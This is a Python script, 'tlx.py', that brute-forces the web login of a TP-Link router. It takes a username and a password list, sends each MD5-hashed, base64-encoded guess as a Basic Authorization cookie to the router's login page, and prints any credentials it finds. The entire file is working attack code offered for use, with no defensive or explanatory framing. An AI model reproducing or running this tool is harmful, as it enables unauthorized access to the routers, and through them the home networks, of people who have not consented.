import requests
import base64
import urllib.request
import base64
import hashlib
import re
import sys
import os.path

# IP Adress tp link
url = ""
h = "\r\r\n *** Error *** \nUsage:\ntlx.py user -fp pass.txt ip_address\nuse: -h or --help to help"
s = requests.session()
# function to hex md5
def md5(text):
    m = hashlib.md5()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

#---function for login by user and password
def login(user,psw):
    print("login user:" + user + "|pass:" + psw)
    # user-agent google chrome
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
        "referer" : url,
    }
    psw = md5(psw)
    auth = user + ":" + psw
    auth = base64.b64encode(auth.encode()).decode('ascii')
    # ---cookie
    cookie = {"Authorization":"Basic "+ auth }
    try:
        req = s.get(url,headers=headers,cookies=cookie)
        match = re.search('window.parent.location.href = ("http)',req.text)
        Res =   not (not match)
        return Res
    except:
        print(h)
        exit(0)

# function to start guess/attack

def check(LoginUser,list):
    found = False
    for i in range(0,len(list)):
        LoginPass = list[i]
        t = login(LoginUser,LoginPass)
        if t:
            found = LoginPass
            break
    return found


def main():
    global url
    help = 0;
    try:
        cmd = sys.argv[1]
        if cmd.lower() == "-h" or cmd.lower() == "--help":
            help = 1

            #exit(0)
        user = cmd
        passType = sys.argv[2]
        psw = sys.argv[3]
        url = sys.argv[4]
    except:
        if help == 1:
            print("Usage: \ntlx.py user [-p or -fp] [pass or pass.txt] ip_address")
        else:
            print(h)

        exit(0)

    # if password type file
    if passType == "-fp":
       if os.path.isfile(psw):
            file = open(psw,"r")
            try:

                passwords = file.read().split("\n")
            except:
                print("Error: in Processing file\n use one line between each word")
       else:
            print("file passwords not found")
            exit(0)


    elif passType == "-p":
        passwords = [psw]
    else:
        print(passType+" undefind")
        exit(0)
    path = "/userRpm/LoginRpm.htm?Save=Save"
    ch = re.match('^(?:http)?://',url)
    if not ch:
        url = "http://"+url
    if not re.match(path,url):
        url += path


    Pass =  check(user,passwords)

    if Pass:
        fud = "found: user="+user+"|password="+Pass
        print("-"*len(fud))
        print(fud)
        print("-"*len(fud))
    else:
        print("Not found")


if __name__ == "__main__": main()
